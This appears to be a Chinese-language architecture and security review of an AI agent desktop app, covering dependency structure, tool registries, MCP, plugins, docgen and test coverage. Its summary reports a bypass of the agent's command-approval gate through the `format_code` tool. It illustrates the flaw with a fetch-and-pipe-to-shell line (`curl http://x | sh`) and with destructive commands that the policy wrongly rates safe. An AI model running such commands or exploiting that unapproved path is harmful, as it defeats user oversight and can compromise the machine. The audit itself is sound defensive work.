# AI Divine Desktop 架构评审

> 日期：2026-09
> 方法：5 路并行代码勘察 + 全局依赖图分析（本轮只分析，未改代码）
> 基线：`main` @ 447 commits（含此前的 agent 子包拆分与工具插件化）

---

## 0. 摘要

**规模**

| 层 | 文件数 | 行数 | 结构 |
|---|---|---|---|
| 后端 `divine-server/app` | ~330 | **71,068** | docgen 23,923 / tools 21,533 / agent 12,471 / api 4,433 / db 3,611 / llm 1,325 / skill_lib 1,209 / mcp 478 / 根级 15 文件 2,085 |
| 后端测试 | 117 | 24,272 | 1,295 个 test 函数 |
| 前端 `divine-app/src` | ~200 | **29,184** | 73% 在 `pages/`，其中 67% 在 `pages/chat/` |
| Rust 壳 `src-tauri/src` | 11 | 1,704 | 26 个 tauri 命令 |

**核心结论**

1. **🔴 发现 5 个安全缺陷（S1-S5，实测确认）**，其中最严重的是**完整审批旁路**：`format_code` 不在 `_COMMAND_TOOLS` 却实现了 `build_command`，导致 `is_terminal=False` → 策略函数**根本没被调用** → 接受任意命令免确认执行（实测 `curl http://x | sh` 本该 `confirm`）。另有 `terminal_policy` safe 档过宽（`echo evil > src/main.py`、`python3 -c '...'`、`git branch -D main` 全判 safe）、MCP 审批卡不显示参数、插件零来源校验、进程内工具"假超时"。
2. **结构性根因**：79 个工具与 6 处手写名字集合之间**零成员校验**——这一个缺陷同时生产了审批旁路、`create_plan` 死注册、25/79 工具测试盲区、策略消费端缺失。**修 2 行可堵 S1，但根治需加不变量测试**。
3. **运行时性能与局部工程质量已达高水准**（虚拟滚动、rAF 合帧、增量 Markdown 解析、重库全懒加载、Rust 零 `unwrap`、后端 1,295 个测试、docgen 的 pdf 分层、`tools/graph/` 的生成式 schema + 漂移守卫），**短板集中在结构性架构能力**：域内共享层缺失、跨层依赖反向、巨型函数、工具来源分散、前后端契约无同步机制、CI 零门禁。
4. **3 个业务 P0 缺陷**：项目级技能永不加载（漏传 prop）；切视图丢失对话草稿（组件被卸载）；`Any` 未定义致类型注解失效。另有 `rag_store` 进程级建表标志致切换 DB 后不建表、agent/monitor/reminder 三类定时任务永不写执行历史。
5. **依赖关系实测无环，但有 4 处"靠顺序/懒加载续命"的成环设计**——其中 `agent/core` 名为叶子层实际依赖 4 个兄弟子包，**不变量仅靠 `__init__.py` 的 docstring 维持**。
6. **两处逐字级重复**：`rag_store` vs `db/retrieval`（两套 TF-IDF）；`events.format_sse` vs `sse.sse_event`（两套 SSE 序列化）。

**优先处理**：安全修复（<150 行，建议立即）→ P0 业务缺陷 + CI 门禁 + 前端补测（2-4 天）→ Agent 契约与依赖理顺（1-2 周）→ docgen 共享层（2-3 周）。

---

## 1. 全局结构与依赖分析

### 1.1 依赖完整性（重要：实测当前无真循环，但有 4 处"靠顺序/懒加载续命"的成环设计）

> **实测结论**：把 `app.agent.{core,core.prompts,intent,middleware,rag,state,tools,tasks,orchestrator,memory_extract}` 以及 `tools.execution`、`tools.tools`、`state.compact`、`middleware.preprocess`、`intent.intent`、`core.prompts`、`core.sse`、`tasks.webhook` **各自作为"首个导入模块"放进全新解释器**，全部导入 OK —— **依赖图当前无环**。以下均为"结构性隐患"，不影响当下运行，但**不变量靠约定而非结构保证**。

| # | 成环设计 | 证据 | 风险 |
|---|---|---|---|
| ① | **`agent/core` ↔ `agent/{intent,state,tools,middleware,rag}`** | 正向：`core/prompts.py:19,25,27,488`、`core/sse.py:320`（共 5 处）；反向：`intent/intent.py:19,20,453,544`、`state/compact.py:18,19,103,322`、`tools/tools.py:22`、`middleware/middleware.py:9` 等 | **核心不变量失守**：`core/__init__.py` docstring L8-12 自认"prompts 故意不放进 `__init__`，否则 core↔sibling 成环"——**用门面约定掩盖了目录层面的环**。一旦有人把 `prompts` 加进 `core/__init__`，`core→state→(compact.py:18)core` 会命中半初始化模块 |
| ② | **`docgen/pdf` ↔ `docgen/chart`** | `pdf/renderer/weasyprint.py:54` → `...chart.recolor`；`chart/recolor.py:16` → `..pdf.theme_colors` | 双方都在**函数内**延迟导入，运行时不炸 |
| ③ | **`scheduler` ↔ `agent/tasks`** | `scheduler.py:95,174` → `agent.tasks`；`agent/tasks/builtins.py:32` → `scheduler`（且回调**私有方法** `_run_agent_task`）；`scheduler.py:173` 注释自认"延迟导入：避免模块级循环依赖" | 跨"域"双头（见 §2.3） |
| ④ | **`tools/execution.py` → 自身包 `__init__`** | `execution.py:22` `from . import _ask_interrupt, _execute_tool`，而 `tools/__init__.py:13` 才 import `.tools`（反向 import execution） | **依赖 `__init__` 内语句先后顺序，重排即 ImportError** |

### 1.2 跨层违规

| 违规 | 位置 | 应然方向 |
|---|---|---|
| agent → api | `agent/orchestrator.py:16` `from ..api.terminal import create_terminal_decision, remove_terminal_decision`（FastAPI 路由文件里的函数） | 抽到中立模块（如 `app/hitl.py`） |
| tools → agent | `tools/adapters/code_review.py:57` `from ...agent.core import _build_llm` | 注入 LLM 工厂 |
| tools/scripts → docgen | 11+ 处直接深入（`presentation.py` 深入 5 子模块、`word_document.py` 4 个） | 加 facade |
| **docgen → tools/scripts** | `docgen/xlsx_editor.py:213-218` `from app.tools.scripts.spreadsheet import THEMES, _coerce_cell, _style_data_cell`（**私有函数**） | 反向，应下沉到 docgen |
| api → docgen 内部 | `api/files.py` → `docgen.pdf.preview`+`docgen.ppt.pptx_to_png`；`api/sessions.py:232` → `docgen.pdf.export` | 经 service/facade |
| SQL 泄漏 | `rag_store.py`（自建 DDL + 7 处 SQL）、`agent/state/compact.py:296-300`（裸 SELECT messages） | 收口到 db/ |
| db → 根级工具 | `db/history.py:10` `from ..file_types import ...` | 持久层依赖文件类型工具 |

### 1.3 扩展成本（架构质量的直接度量）

| 动作 | 需改动 | 风险 |
|---|---|---|
| **新增工具** | ① 新建 adapter ② 手工在 `adapters/__init__.py`（89 行）加 import ③ 在 spec 加 hiddenimports（27 条） | 漏 ③ → 打包后工具消失，本地无感 |
| **新增文档主题** | 改 3 个主题 dict（PDF/PPT/Word）+ 新建 CSS + 更新 3 个 adapter 的 JSON Schema enum + 可能加 resume 模板；**无单一事实源**（`grep THEME_IDS\|BASE_THEMES` 零命中） | 改漏 → 主题部分场景不可用 |
| **新增定时任务类型** | 写 handler + 在 `tasks/__init__.py:50-53` 加副作用 import + 若需执行历史还要额外接 `RunRecorder`（见 §2.4） | 漏接则执行历史缺失 |

### 1.4 re-export shim：已从"过渡"固化为负债

| 子包 | `__init__` 导出 | 其中私有 `_x` | 死导出 | 备注 |
|---|---|---|---|---|
| core | 28 | 13 | 2 | — |
| state | 19 | 15 | 4 | 含一条"反向 shim"：`state/__init__.py:29` 再导出 core 的 `estimate_tokens`，导致 5 处从 state 拿 core 的东西 |
| intent | 13 | 3 | 2 | — |
| middleware | 10 | 2 | 0 | — |
| tools | 10 | 9 | 5 | — |
| rag | 2 | 2 | 1 | **10 行 shim 包 62 行模块**，纯开销 |
| **合计** | **82** | **44（54%）** | **14（17%）** | — |

**关键事实**：82 个导出里实际被包级导入的只有 59 个，其中 **24 个只服务测试**（如 `from app.agent.state import _finish_todo`）。最贵的一条链是 **3 跳 shim 专为测试而活**：

```
agent/intent/local_task.py（真实现 536 行）
  → app/api/chat_local.py:29-55（25 个私有符号，本文件仅用 5 个，其余 # noqa: F401）
  → app/api/chat.py:948-975（二次 re-export）
  → tests/test_local_task_routing.py:11（从 app.api.chat 取 _detect_local_task）
```
改一次 agent 内部命名要动 2 个 api 文件。

**同时存在"绕过 shim"**：`api/chat.py:13` 走深路径 `core.constants`，而 `orchestrator.py:20` 走 shim —— 同一符号两种取法。

### 1.5 对外公开面失控

app/ 共 **37 处**导入 agent（28 走 shim / 9 深路径），涉 **30 个私有符号**：

| 消费者 | 私有符号数 | 例子 |
|---|---|---|
| `api/chat_local.py:29` | **25**（其中约 20 个本文件未使用） | `_detect_local_task`、`_is_simple_translation`… |
| `api/chat.py` | 2 | `_resolve_model_entry:512`、`_start_local_model:562` |
| `main.py:188` | 1 | `_resolve_tool_mode` |
| `api/mention_skills.py:30` | 1 | `_skill_tool_name` |
| `tools/adapters/code_review.py:57` | 1 | `_build_llm` |

**真实公开面其实很小**：`run_agent`、`run_task`、`compact_session`/`build_context_breakdown`、`maybe_preprocess(_attachment)`、注入队列 4 函数、本地模型管理 5 项。**其中 21/37（57%）的外部导入是为"本地小模型运行时管理"——这是基础设施，却住在 `agent/core`**，这直接解释了 `core/local_llm.py`(924) + `core/model_registry.py`(507) 为何体积失控。

---

## 2. agent 层（12,471 行 · 46 文件）

### 2.1 巨型函数/类（最严重问题）

| 位置 | 规模 | 说明 |
|---|---|---|
| **`tools/execution.py:208-1220` `_handle_adapter_call`** | **1,013 行**（≈包体 8%） | 内含 14 处 `if name ==` 分支：审批/plan_choice(285)、run_subagents(304)、migrate_skill(s)(390,449)、install_skill(523)、terminal 策略(671)、git_commit/revert(679)、bg_kill(736)、web_fetch_batch(955,979,1031)、read_image(1002)、编辑工具语法检查(1050)、office 校验(1088)、write_calendar(1173)。**工具执行主路径，任何工具改动都落在这一个函数里** |
| `orchestrator.py:374-1002` `run_agent` | **629 行** | 混合会话修复、token 预算、本地分流、SSE、落库、压缩 |
| `core/local_llm.py:141-909` `LocalLLMManager` | **769 行 / 22 方法** | 三种无关职责：进程生命周期 + 模型文件管理 + 推理（classify/summarize/organize 各一份 `requests.post`：539/606/665） |
| `tools/subagents.py:741-936` `_run_subagents` | 196 行 | 另有 write-claims/snapshot/recovery 一堆（169-450） |
| `core/prompt_sections.py` | 840 行 | **0 个顶层 def**，纯 prompt 常量墙（diff/grep 噪声源，风险低） |

**职责错位**：`_start_local_model` 在 `middleware/preprocess.py:251-318`（进程拉起！）、模型下载在 `core/model_registry.py`、本地模型 HTTP 调用散在 **5 处**（`local_llm.py:539/606/665`、`memory_extract.py:154`、`api/chat_local.py`）——**没有统一的 `chat()` 封装**。

### 2.2 `core` 名不副实

`core/` 名义是"零依赖叶子层"，实际：

- `core/prompts.py` 是**跨 4 个子包的组装枢纽**（intent/rag/state/middleware），553 行；单文件即拉进 `db` + `config` + `db.retrieval` + `localization` + `skills`（`prompts.py:12-16`）
- `core/local_llm.py` + `core/model_registry.py` = 1,431 行**基础设施**（进程管理/模型下载/硬件探测），与"core 领域核心"语义无关

**agent 对 app 根的重度耦合**（11 个根模块被导入）：`config` 16 处、`tools.*` 11、`localization` 5、`llm` 5、`mcp` 4、`skills` 4，另有 **12 处** `from ... import db`（`middleware/middleware.py:10`、`tasks/common.py:15`、`tools/execution.py:13`、`state/compact.py:16`、`intent/intent.py:17`、`state/plans.py:7`、`tools/subagents.py:44`、`tools/tool_runtime.py:12`、`state/persistence.py:10`、`core/prompts.py:12`、`tasks/interactive.py:57`、`tasks/digest.py:74`）

**建议**：
- `prompts.py` 提为顶层 `agent/prompt_hub.py`（5 处导入改动：`tools/tools.py:32`、`tools/execution.py:20`、`tools/react.py:53`、`tests/test_memories.py:541` + docstring），core 恢复真叶子（12→11 文件）
- 本地模型管理迁出为 `app/local_runtime/`（约 1,430 行），core 缩小约 1/3，**消除 57% 的外部错位依赖**（37 处 app/ 导入中 21 处是为本地模型管理）
- 新增 `agent/api.py` 显式公开面（`__all__` 列 10 个真正公开的符号），统一 40 处 app/ 与 tests 导入，承认 5 个被外部挖取的私有符号为公开

### 2.3 tasks 子包：双头治理导致可观测性缺陷

| 事实 | 证据 |
|---|---|
| 同一语义（跑一轮 Agent）**两份实现** | `scheduler.Scheduler._run_agent_task`（`app/scheduler.py:171-215`）vs `tasks.common.run_agent_with_user_prompt`（`tasks/common.py:83-137`）——都是取/建会话 → 切 plan_mode → 写 user 消息 → 通知前端 → history_for_model → run_agent → finally 还原 plan_mode，差异仅 approval/plan 策略 |
| **可复现的行为缺陷** | `create_run` 只在 `RunRecorder`（`common.py:163`）调用，调用方仅 digest/webhook/interactive（`digest.py:30`、`webhook.py:25`、`interactive.py:59`）→ **agent / monitor / reminder 三种类型永远不写 `task_runs`**，"执行历史"里看不到它们 |
| 错误被记两次且语义不同 | `scheduler._run_due` 用 try/except 统计 ok/error（`scheduler.py:97-107`），而 handler 内部已自行吞异常（`webhook.py:57`、`digest.py:65`、`interactive.py:90`） |
| 注册表语义弱 | `register` 重复注册只 warning 并覆盖（`tasks/__init__.py:23-30`）；未知 task_type 只 warning return（`:39-45`），无 fail-fast |
| 票据仅进程内存 | `interactive.py:36-38` `_DECISIONS` dict → 服务重启丢票，DB 的 `pending_user_action` 残留（模块 docstring 自认） |
| 死代码 | `scheduler.py:144-149 _mark_reminder_due` 全仓无调用者 |

### 2.4 `memory_extract.py`（顶层 177 行）

挂在"会话压缩"收尾点做隐式记忆抽取，唯一生产调用点是 `state/compact.py:273`（函数内懒导入）。**在顶层是"为避免落错包"的折衷**（放 state 会多一条 state→core 边，放 core 会让 core 依赖 db）。代价：无归口、测试绑顶层路径。建议移至 `state/memory.py`（3 行导入改动）。

### 2.5 测试覆盖

47 个测试文件直接 import `app.agent.*`，46 个模块中 36 个有直接测试。**唯一结构性盲区**：

| 盲区 | 事实 |
|---|---|
| **`rag/` 零覆盖** | 全 tests/ 无任何 `app.agent.rag` 引用，而 `core/prompts.py:25` **每次构建动态 prompt 都调用它** |
| `intent/local_task.py` | 只被 3 跳 shim 覆盖（改任一层即断测试） |
| `tasks.builtins` / `scheduler._run_agent_task` | 有 dispatcher 测试，但**无任何测试断言 task_runs 记录**（`test_task_runs*.py` 只测 db 层）→ §2.3 的缺陷逃过测试 |

---

## 3. docgen 层（23,923 行 · 最大域）

### 3.1 核心判断

**模块边界合理（pdf/resume/ppt/word/chart 划分清晰），问题是域内共享层完全缺失**——无 `docgen/common/`、无 `docgen/theme/`：

| 重复项 | 份数 | 位置 |
|---|---|---|
| 颜色解析（色名表 + hex/rgb + HSL 派生） | **3-4 份** | `pdf/theme_colors.py:319,359,399` / `resume/templates/colorize.py:28,118` / `chart/recolor.py:32` / `ppt/pptx_to_png.py:66` |
| markdown 扩展清单 | **5 份** | `pdf/renderer/weasyprint.py:127`、`reportlab.py:274`、`travel_html.py:179`、`api/pdf_themes.py:67`（word 缺 `extra`） |
| HTML→PDF 调用 | **4 处** | `renderer.py:127`、`weasyprint.py:180`、`resume/templates/__init__.py:138`、`form_html.py:392` |
| Office `apply_ops` 编辑骨架 | **3 份同构** | `xlsx_editor.py:447` / `word/editor.py:347` / `ppt/editor.py:114` |
| 字体硬编码 | **4 处** | `pdf/export.py:21`（macOS 专有路径）/ `ppt/pptx_to_png.py:38`（5 条）/ `word/elements.py:15` / `ppt/renderer/layouts.py:28` |

### 3.2 主题系统：四套平行实现

| 维度 | PDF | PPT | Word | Resume |
|---|---|---|---|---|
| 定义处 | `pdf/theme_registry.py:18` | `ppt/renderer/themes.py:30` | `word/themes.py:13` | `resume/templates/registry.py:5` |
| 条目数 | 19 | 19 | 8 | 19 |
| 格式 | 外置 CSS + `string.Template` | 内联扁平 hex | 内联扁平 | `__import__` 动态加载 |
| 加载 | 运行时读盘 | 内存 dict | 内存 dict | 动态 import |

8 个同名 id（`universal/notion/linear/apple/academic/travel/roadmap/minimal`）硬编码在 3 套 dict，**token 与取值都不同**（PDF travel `#2a5a5b` vs Word travel `#EA580C`）。

### 3.3 具体缺陷

| 严重度 | 问题 | 位置 |
|---|---|---|
| 🔴 高 | **简历 PDF 绕过渲染 facade**：直连 WeasyPrint，无可用性检查、无 reportlab 降级、无 QA（PDF 主路径有 `engine.py:421 render_with_qa`） | `resume/templates/__init__.py:136-138` |
| 🔴 高 | **reportlab 降级路径静默丢图**：`_rasterize_svg` 仅依赖 resvg_py，缺失时吞异常返回 None | `pdf/renderer/reportlab.py:13-24` |
| 🟠 中 | **模板 97.3% 重复**（实测：488+487 行，diff 仅 25 行） | `resume/templates/t18_kami.py` / `t19_kami_white.py` |
| 🟠 中 | **PPT 单文件含两套并列渲染器**：devconf 与 keynote 每类页面各写一遍 | `ppt/renderer/sample_pages.py`(1,706) |
| 🟠 中 | **死代码 + 为死代码写测试** | `pdf/renderer/markdown.py:407`(80 行)、`tests/test_pdf_renderer.py:1,10` |
| 🟡 低 | 必应图片搜索寄生在封面模块 | `pdf/cover_builder.py:619-731` |
| 🟡 低 | 跨模块可变全局耦合：`export.FONT_NAME` 被反向读取 | `pdf/export.py:26` ↔ `reportlab.py:268-272` |
| 🟡 低 | 文档陈旧「12 套设计母版」实为 19 套 | `resume/templates/__init__.py:1`、`registry.py:1` |

### 3.4 字体：零资源，跨平台不可复现

CSS 引用 `Inter`/`Noto Sans SC`/`Source Serif Pro`/`JetBrains Mono`（10 文件 31 处 `font-family`），但**仓库零字体文件、零 `@font-face`**；spec 无字体 `datas`。

> 实测核实：仓库内 10 个 `.ttf` 全在 `.venv/`（reportlab 自带 Vera），项目自身零字体资源。**macOS 靠宿主系统侥幸可用，Linux/容器排版不可复现。**

### 3.5 测试

34 文件 / 411 例。**3,000+ 行零覆盖**：`sample_pages.py`(1,706)、`reportlab.py`(308)、`pdf/renderer/styles.py`(229)、`ppt/charts.py`+`tables.py`(262)、`pdf/export.py`(156)、`pdf/preview.py`(61)、`ppt/qa.py`(34，历史事故护栏)。

---

## 4. tools 与 mcp 层（21,835 + 478 行）

### 4.1 结构与运行期事实

| 区域 | 文件 | 行数 | 说明 |
|---|---|---|---|
| `tools/adapters/` | 70 | 7,411 | 51 个有 `script_name`，18 个无（adapter 内自带实现） |
| `tools/scripts/` | 55 | 10,138 | 51 个 `main()` 入口 + `file_utils`/`svg_common`/`web_common` 共享 |
| `tools/`（核心） | 14 | 2,747 | `registry.py`/`base.py`/`bg_process.py`/`terminal_policy.py`/`diagnostics.py` 等 |
| `tools/graph/` | 4 | 1,536 | GraphIR 契约包（`schema.py` 403 + `validator.py` 803 + JSON Schema 299 + `__init__` 31） |
| `mcp/` | 3 | 478 | MCP 协议（`manager.py` 415 + `adapter.py` 56） |

**运行期事实**：`registry.list()` 实测 **79 个工具 / 18 个 category**（files 18、system 16、documents 9、svg 5、skills 5、html 4、memory 4、pdf 3…）。构成 = 51 子进程 + 6 进程内 + 22 adapter 内实现；51 个 `script_name` 服务 57 个工具（`git_tool.py`×5、`memory.py`×3）。

**Schema 体量**：`openai_schema` 全表 **75,584 字符**；恒注入 55 个 = 43,372 字符；意图裁剪后 24 个 = 32,212。描述最长 `render_graph` 1,774 字符（含参数 3,704 ≈ 单工具 5.5k）、`html_generate` 1,084、`generate_chart` 991；**中位数仅 116**。另有 **38 处描述显式点名其他工具**（工具路由靠 prompt 硬撑）；`tools.py:52-53` 注释仍以"60 工具 ≈ 13.3k token"为基准（已过时）。

### 4.2 🔴 四套工具来源，唯一汇聚点

`agent/tools/tools.py::_build_tools` 同时合并 **4 个独立来源**：

| # | 来源 | 接入方式 | 位置 |
|---|---|---|---|
| ① | **内置工具**（79） | `@register_tool` 装饰器 → `registry` | `tools.py:131` 遍历 `registry.list()` |
| ② | **插件工具** | `load_plugins_from` 注册进**同一个** registry | `main.py:57-62` lifespan |
| ③ | **技能工具** | `skill_registry.executable_skills()` | `tools.py:156` |
| ④ | **MCP 工具** | `mcp_manager.snapshot_tools()` **动态构建，不注册进 registry** | `tools.py:213-232` |

**MCP 的可见性裂缝**（`mcp/adapter.py:1-5` 自认）：
- `registry.list()` 看不到 MCP 工具 → **子 Agent 拿不到**（`subagents.py:504` 只遍历 `registry.list()`）、`api/settings.py:54` 工具列表与 health 计数都不含
- **无任何意图裁剪语义**：MCP 工具恒注入 schema（装 20 个工具的 server 直接给 schema 加 20 项）
- `McpToolAdapter` 是**鸭子类型**而非 `ToolAdapter` 子类
- 执行侧复用同一管线：`execution.py:652-663` 对所有 `mcp_` 前缀强制 `is_terminal=True` → 走 terminal 确认卡（但见 S3：卡片不显示参数）

### 4.3 🔴 结构性根因：手写名字集合零成员校验

见 §8.3 —— **79 个工具与 6 处硬编码集合（`_READ_ONLY_TOOLS`/`_NO_PLAN_TOOLS`/`_LOCK_FREE_TOOLS`/`_CONTENT_TOOLS`/`_COMMAND_TOOLS`/`_EDIT_TOOLS`）之间没有任何成员校验**，一个缺陷同时生产：审批旁路（S1）、`create_plan` 死注册、25/79 工具测试盲区、策略消费端缺失。

**直接后果**：`render_graph`（纯 CPU 零 IO）未进 `_READ_ONLY_TOOLS`/`_LOCK_FREE_TOOLS` → 白白吃 plan-first 与会话级写锁。

### 4.4 执行路径与超时

| 路径 | 实现 | 特性 |
|---|---|---|
| **子进程**（51 个） | `base.py:126-196 _run_subprocess_tool`（`subprocess.run(timeout=…)`） | 真超时可中断、进程隔离、stdout JSON 契约 |
| **子进程流式**（1 个） | `base.py:198-292`（`asyncio.timeout` + `process.kill`） | 仅 `web_fetch_batch` 使用 |
| **进程内**（6 个） | `base.py:294-343 _run_in_process`（importlib + `asyncio.to_thread`） | **超时不可中断**（S5）、丢 `locale`/`output_dir`、脚本内 `sys.path.insert` 污染主进程 |

**内联收益被高估**（实测）：`read_file` 读 2 万行，子进程 28.2ms vs 内联 0.8ms —— 省 27ms，而 LLM 往返是秒级；重脚本 import 0.12-0.28s。

**超时配置**：外层 `asyncio.wait_for` (`tool_runtime.py:248-262`) + 内层 `subprocess.run(timeout)`；`effective_timeout` **仅 4 个 adapter** 实现（`terminal`/`lint_check`/`run_tests`/`format_code`，clamp 60-600），其余用类属性（60s×19、30s×17、10s×10…）。重试仅 4 个工具（`web_search`/`web_fetch`/`web_fetch_batch`/`rag_search`）。

### 4.5 插件机制：加载能跑，但无运维面

| 项 | 状态 |
|---|---|
| 加载 | ✅ `load_plugins_from` 目录扫描（glob `*.py`、跳过 `_` 前缀、合成 `divine_plugin_<stem>`、坏插件 `logger.exception` 后 continue） |
| 管线 | ✅ 插件走完整执行管线（审批/策略/超时/落库） |
| **重载/卸载** | ❌ 无 API、无 UI（19 个 router 中无 `plugins` 路由）、必须重启 sidecar；`load_plugin_module` 除测试外无调用方 |
| **状态可观测** | ❌ 无 `GET /api/plugins` |
| **能力声明** | ❌ 插件无法声明 `read_only` → 被加会话写锁、触发 plan-first、无法被意图裁剪（恒注入 schema） |
| 来源校验 | ❌ 见 S4 |
| 部分注册残留 | ❌ 见 §8.2 |
| 文档一致性 | ❌ `docs/plugins.md:47-48` 声称的"重载接口""API 预留""`example_hello.py`"**三者均不存在** |

### 4.6 工具粒度与重叠

| 重叠组 | 说明 |
|---|---|
| `migrate_skill` vs `migrate_skills` | **完全同能力** |
| `web_fetch` vs `web_fetch_batch` | 单/批 |
| `svg_to_png` vs `svg_to_png_batch` | 单/批 |
| `glob_files` vs `search_files` | 功能相近 |
| `html_generate` / `html_common` / `ux_html` / `html_resume` | `html_generate` 已 import `ux_html` 的 `inject_scaffold`/`lint_html`；`html_common` 是 99 行"原样落盘"变体 |
| `generate_chart` / `render_graph` / `mermaid_export` | 语义正交但**描述互指** |
| `bg_status` / `bg_output` / `bg_kill` | 可合并为 action 枚举 |
| `pdf_generate` / `pdf_render` / `pdf_form_generate` | 三个 PDF 入口 |

> **不建议删**：5 个 write 类工具的冗余是刻意的（不同写入语义）。

### 4.7 tools/graph/：全仓工程质量最高的一档

1,536 行 GraphIR 契约包。**生成式 schema**（`schema.py:299 json_schema()` 由枚举生成）+ **漂移守卫**（`test_render_graph.py:477-478` 断言 `on_disk == S.json_schema()`）+ 45 个用例。`validator.py:396 validate_graph_ir` 做禁止键扫描（坐标/色值/污染键 `:165`）、引用完整性、场景特化（2b-2h）、环检测（`:362`）。

唯一消费方 `render_graph.py:28-29`，`run()` 纯校验零 IO。与 `chart`/`docgen` **无代码耦合**（`generate_chart` 走 `scripts/generate_chart.py:9` → `app.docgen.chart.svg`，另一体系）。

**小问题**：`render_graph` 未进只读/免锁集合（§4.3）；`graph_ir.schema.json` 是签入产物但**无生成脚本**，且**不在打包产物中**（§4.9）。

### 4.8 mcp/：生命周期质量高于 tools 均值，但有可见性裂缝

- 官方 `mcp>=2.1,<3`，仅 stdio，SDK 惰性 import（`manager.py:125-126`）
- **keeper-task 模式**规避 anyio cancel-scope 跨任务崩溃（`manager.py:9-13,72-203`）
- 常量：connect 8s / call 180s / index TTL 120s / failure cooldown 5s / 文本 40k 截断（`:206-226`）
- 索引按 config 指纹重连（`:248-272`），每轮 run 前刷新（`orchestrator.py:474-478`），退出时 shutdown
- 配置在 `settings.json` 的 `mcp_servers`；API 仅 `GET /api/mcp/servers` + `POST /{id}/test`；前端有 `SettingsModal/McpSection.tsx`
- ✅ 正面：keeper 模式、失败隔离、冷却、TTL、密钥保留、坏配置容忍

**问题**：可见性裂缝（§4.2）、审批卡不显示参数（S3）、索引陈旧窗口（只在 index 非空时替换 `manager.py:379-381` → 停用/删除 server 后旧工具留存至 TTL）、`manager.py:101` 的 `except` 元组含 `Exception` 会吞 `CancelledError`、import 期造单例（`Queue`/`Event` 早于 loop，当前单 loop 无碍）。

### 4.9 打包：风险比预期低，但有隐性缺口

| 项 | 实测 |
|---|---|
| ✅ hiddenimports | `collect_submodules("app.tools")` = **141 模块**全在包内（PyInstaller 反查真实产物确认） |
| ✅ scripts | 整目录 `datas` 双保险，55 个 `.py` 全在 |
| ⚠️ 冗余 | `spec:227-233` 手写的 6 个 scripts 条目已被 `collect_submodules` 覆盖（历史包袱）；`base.py:309-311` 注释已过期 |
| ❌ 卫生 | **23 个 `__pycache__/*.pyc` 被目录级 `datas` 一并打进包**（解压 287KB） |
| ❌ 缺口 | **`graph_ir.schema.json` 不在产物**（`datas` 未含 `tools/graph/`）—— 当前无运行时读取故未暴露 |
| ⚠️ 隐性规则 | "`app/tools` 下 `.py` 自动进包、**其它文件自动丢**" → 一旦新增 `tools/xxx/templates/*.html`，dev 能跑、打包后 `FileNotFoundError`，**只在发版暴露** |
| 🗑 | `tools/templates/` 空目录且未被 git 跟踪 |

### 4.10 测试覆盖：重点厚、长尾薄

工具相关测试函数 **491 个**。最厚：`test_render_graph` 45、`test_memories` 34、`test_diagnostics` 29、`test_ux_html` 27、`test_xlsx_editor` 20。

**零直接覆盖 25/79**：`search_files`、`read_image`、`image_resize`、`pdf_split_merge`、`rag_index`、`rag_search`、`sqlite_query`、`web_fetch_batch`、`describe_svg`、`draw_svg`、`edit_svg`、`svg_to_png(_batch)`、`install_skill`、`preview_skill_repo`、`migrate_skill(s)`、`clipboard`、`undo_last_turn`、`remember`、`manage_model_providers`、`mermaid_export`、`schedule_task`、`write_calendar`、`create_plan`。

> 其中 `sqlite_query`（SQL 白名单）、`undo_last_turn`（会改文件）、`schedule_task`/`write_calendar`（写库+审批）、`install_skill`（网络装脚本）都是**副作用工具**，恰是最该测的。

**更关键的是缺失的不变量测试**：无 `script_name` 存在性断言（`base.py:133-135` 只在运行时抛错）、无注册表规模/命名单调性断言、无 `hasattr(build_command) ⇒ in _COMMAND_TOOLS`、无 `allow_external_paths ⇒ override external_paths`（人工验证 0 例外但无守卫）、无"内联脚本双路径行为一致"测试。

> **投入产出比最高的一件事**：加 `tests/test_tools_registry_invariants.py`（§10 第零批 S-3），会立刻抓出 `create_plan` 死注册与 schema 膨胀。

---

## 5. 基础设施层（api / db / llm / skill_lib / 根级）

### 5.1 根级 15 个平铺模块

| 文件 | 行 | 职责 | 问题 |
|---|---|---|---|
| `config.py` | **457** | **6 类职责混编**：env 引导 + 路径布局 + **安全 chmod 0600** + **模型条目归一化（187 行，41%）** + SettingsStore 缓存 + CORS | `SettingsStore._build()` 硬编码 30+ 默认键 → 任何新增设置都要改 config.py；`_is_git_workspace:389` 在配置层跑外部命令 |
| `schemas.py` | 262 | 22 个 Pydantic 模型 | 2 个死模型（`ProjectReorderItem:129`、`ModelConfigUpdate:138` 零引用） |
| `model_providers.py` | 237 | 提供商模板目录（JSON 落盘） | 与 `llm/` 不重叠（目录 vs 适配器），但**"选 active 条目"有 4 份拷贝**（见 4.5） |
| `rag_store.py` | **231** | 工作区 RAG：**自建 DDL + 第二套 TF-IDF** | 见 4.4 —— 与 `db/retrieval.py` 逐字重复 |
| `scheduler.py` | 221 | 轮询循环 + 到点执行 | 与 agent/tasks 双头（§2.3） |
| `events.py` | 86 | 进程内 pub/sub | 与 `sse.py` 两套 SSE 序列化（见 4.3） |
| `sse.py` | 22 | SSE 线格式 | 同上 |
| `skills.py` | 25 | **纯 re-export 门面** | 零逻辑 |
| `github_skills.py` | 5 | **纯 re-export 门面** | 5 行换 0 价值 |

同一调用方要记两个门面名：`agent/tools/execution.py:14` 走 `github_skills`、`:15` 走 `skills`。

### 5.2 🔴 `rag_store.py` 的潜在正确性 bug

`rag_store.py:38-42` 用**进程级全局** `_schema_ready = False` 做"只建表一次"守卫。但 `get_conn()` 支持 DB 路径切换（`db/connection.py:51-62`，**测试正是靠此隔离**），而 `_schema_ready` 不随路径复位 → **切换 DB 后新库永远不会创建 rag 表**。该模块零测试，隐患未被捕获。

### 5.3 两套 SSE 序列化实现

| 实现 | 位置 | 差异 |
|---|---|---|
| `sse_event()` | `app/sse.py:7` | `json.dumps(..., default=str)`，容忍非 JSON 类型 |
| `format_sse()` | `app/events.py:50` | `json.dumps(data or {})`，遇 datetime **会抛** |

使用者分裂：`api/events.py:34` 用 `format_sse`；`api/chat.py:35`、`chat_local.py:25` 用 `sse_event`。**同一前端协议由两个容错行为不一致的函数生成。**

### 5.4 🔴 `rag_store` vs `db/retrieval`：逐字重复的两套检索栈

| 内容 | 位置对 |
|---|---|
| 正则 | `rag_store.py:14-15` == `db/retrieval.py:13-14` |
| `tokenize()` | `rag_store.py:68-75` ≡ `db/retrieval.py:17-26` |
| `term_frequency()` | `rag_store.py:78-83` ≡ `retrieval.py:29-33` |
| TF-IDF + 余弦排序 | `rag_store.py:176-231` ≡ `retrieval.py:36-85`（同样的 `log((n+1)/(df+1))+1`、同样的 `dot/(sqrt(norm)*query_norm)`） |

